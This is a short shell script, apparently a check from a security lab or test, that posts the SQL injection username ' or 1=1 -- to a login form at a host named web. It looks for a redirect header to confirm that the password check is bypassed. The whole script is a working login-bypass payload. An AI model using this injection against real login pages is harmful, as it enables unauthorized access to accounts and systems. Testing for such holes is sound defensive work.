#!/bin/sh
# The login form is injectable: a username of ' or 1=1 -- logs in without a password.
curl -s -o /dev/null -D - --data-urlencode "username=' or 1=1 -- " -d 'password=x' http://web/users/login.php \
  | grep -qi '^location:'
